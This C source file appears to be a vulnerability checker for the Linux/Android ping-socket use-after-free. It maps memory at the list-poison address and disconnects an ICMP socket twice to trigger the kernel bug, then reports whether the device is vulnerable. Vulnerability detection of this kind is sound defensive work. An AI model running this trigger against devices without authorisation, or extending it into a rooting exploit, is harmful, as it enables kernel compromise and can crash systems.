#include "idf.h"
#include <unistd.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/sysinfo.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <errno.h>
#include <linux/netlink.h>
#include <linux/if.h>
#include <linux/in.h>
#include <linux/filter.h>
#include <linux/sock_diag.h>
#include <linux/inet_diag.h>
#include <linux/unix_diag.h>
#include <string.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <jni.h>

#define MMAP_BASE 0x200000
#define LIST_POISON 0x200200
#define MMAP_SIZE 0x200000

#define MAGIC_3636 0x20192019

int check(int argc, char **argv)
{
    void *magic = mmap((void *)MMAP_BASE, MMAP_SIZE,
                       PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS,
                       -1, 0);
    memset(magic, 0, MMAP_SIZE);
    *((long *)(LIST_POISON)) = MAGIC_3636;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
    int ret;
    struct sockaddr_in sa1;
    memset(&sa1, 0, sizeof(sa1));
    sa1.sin_family = AF_INET;
    ret = connect(sock, (const struct sockaddr *)&sa1, sizeof(sa1));
    struct sockaddr_in sa2;
    sa2.sin_family = AF_UNSPEC;
    connect(sock, (const struct sockaddr *)&sa2, sizeof(sa2));
    connect(sock, (const struct sockaddr *)&sa2, sizeof(sa2));
    if (*((long *)(LIST_POISON)) != MAGIC_3636)
    {
        close(sock);
        return VULNERABLE;
    }
    else
    {
        close(sock);
        return NOT_VULNERABLE;
    }
}

int main(int argc, char **argv)
{
    return check(argc, argv);
}